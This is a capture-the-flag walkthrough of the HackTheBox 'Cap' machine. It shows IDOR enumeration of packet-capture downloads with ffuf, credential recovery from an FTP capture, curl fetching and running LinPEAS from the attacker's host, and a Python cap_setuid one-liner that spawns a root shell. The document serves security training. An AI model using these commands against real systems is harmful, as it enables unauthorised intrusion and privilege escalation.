HackTheBox - Cap

Cap is an easy Linux machine that requires us to abuse an IDOR vulnerability to gain credentials. After gaining a foothold we abuse a capability to escalate our privileges.

Posted Jun 9, 2025 Updated Oct 12, 2025
By S4nity
4 min read

A quick search for vsftpd 3.0.3 reveals that the version is outdated and vulnerable to remote denial-of-service attacks. This would be important to note down in a real world environment, but not here.

Unfortunately this didn’t work either.

SSH is rarely vulnerable to direct attacks, hence we target the website next.
Entering the website presents us with a dashboard where we are already logged in as Nathan:

It seems to be a dashboard for system administration tasks.
Navigating to the “Security Snapshot” tab reveals some sort of packet capture download (.pcap file), which we can investigate via WireShark.

Gaining a foothold

If we inspect the page closely we can see that the URL is pointing to an object directly.

If we alter the ID (1) to a 2 we can see that the number of packets change, which means that our IDOR attack worked!

You might need to click on “Security Snapshot” again to see that it changed.

To enumerate all possible targets efficiently we need to create a small wordlist that contains all numbers from 0 to 100, which we can do by creating a small bash script:

1
2
3
4
5

#!/bin/bash

for i in {0..100}; do
  echo "$i" >> "wordlist.txt"
done

I called the file wordlist.sh. Enter the name you selected for your script.

Afterwards we make the script executable and execute it.

1
2

chmod +x wordlist.sh
./wordlist.sh

Next, we can inspect the source code to determine where the download button redirects us.

We can do this by pressing CTRL+SHIFT+C and clicking on the download button.

The link shows us /download/ID, which is also a direct reference to the object.
Now we can use our wordlist in FFUF to fuzz for potential targets:

ffuf -w ~/Documents/Cap/wordlist.txt:FUZZ -u http://10.129.242.253/download/FUZZ

0                       [Status: 200, Size: 9935, Words: 386, Lines: 166, Duration: 20ms]
1                       [Status: 200, Size: 24, Words: 1, Lines: 1, Duration: 26ms]
2                       [Status: 200, Size: 1284, Words: 3, Lines: 78, Duration: 30ms]

Taking a look at the size we can see that the file with ID 0 is by far larger than the other two files.
So, lets download the file by navigating to http://IP of target/download/0 .

Afterwards we open the file with WireShark. Our initial NMAP scan showed us that the FTP and SSH ports were open, hence it might be a wise idea to filter for such events. Filtering for FTP reveals credentials for a user called nathan.

They work for SSH, too!

Privilege Escalation

Next we can download the latest version of LinPEAS from GitHub and upload it to our target machine. We can do it by running a Python HTTP server from the directory where the LinPEAS script is located.

Warning! It is best practice to upload files only to folders that are getting wiped automatically, like /tmp for example.

1

python3 -m http.server 80

Then we can download the file, make it executable and run it.

1
2
3
4
5

curl -o linpeas.sh http://<your IP>/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

At first glance it doesn’t look like much we could use, but if we take a look at the capabilities section we can see that the Python installation was modified.

1
2

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

Taking a look at https://gtfobins.github.io/gtfobins/python/ shows us that we just need to run Python, set the UID to 0 (which is the ID of root) and launch a shell.
In this case we need to take minor adjustments to the command, because we are not in the Python-directory and it is Python3, so the command should look like this:

1
2
3
4

python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# whoami
root
